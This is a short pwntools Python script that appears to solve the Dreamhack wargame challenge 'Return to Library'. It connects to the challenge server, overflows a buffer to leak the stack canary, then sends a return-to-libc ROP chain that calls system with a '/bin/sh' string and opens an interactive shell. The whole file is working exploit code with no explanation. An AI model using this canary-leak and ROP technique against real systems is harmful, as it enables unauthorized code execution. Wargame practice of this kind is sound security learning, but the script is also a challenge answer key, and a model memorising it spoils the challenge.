from pwn import *

port = 14397
rem = remote("host1.dreamhack.games", port)
elf = ELF('./Return to Library/problem/rtl')

payload = b'A' * 0x39
rem.sendafter(b'Buf: ', payload)
rem.recvuntil(payload)
canary = u64(b'\x00' + rem.recvn(7))

payload = b'A' * 0x38
payload += p64(canary)
payload += b'\x00' * 0x8

temp = 0x400285
gadget = 0x400853
shell = 0x400874
sysplt = elf.plt['system']
payload += p64(temp)
payload += p64(gadget)
payload += p64(shell)
payload += p64(sysplt)
rem.sendafter(b'Buf: ', payload)

rem.interactive()